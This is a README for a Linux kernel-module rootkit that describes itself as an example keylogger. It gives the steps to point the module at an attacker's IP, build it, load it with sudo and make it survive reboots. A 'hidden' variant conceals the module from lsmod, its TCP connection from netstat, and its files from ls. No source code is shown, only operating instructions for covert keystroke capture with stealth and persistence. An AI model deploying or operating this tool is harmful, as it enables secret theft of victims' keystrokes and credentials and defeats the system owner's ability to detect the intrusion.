# Rootkit
A example keylogger root kit

## Run
---
Change the attacker's IP in `rk_define.h`

### Normal Version
#### Build
```
make
```
#### Load
```
sudo make load
```
#### Unload
```
sudo make unload
```
#### To make the module survive reboot
```
sudo make install
```
#### Uninstall
```
sudo make uninstall
sudo make unload
```
---
### Hidden Version
This version will hide the module from `lsmod`, hide the TCP connection from `netstat` and hide `rootkit.ko`, `rootkit.conf` from being `ls`
### Build
```
make hidden
```
### Load
```
sudo make load
```
### Unload
You will have to reboot the computer
#### To make the module survive reboot
```
sudo make install
```
#### Uninstall
```
sudo make uninstall
reboot
```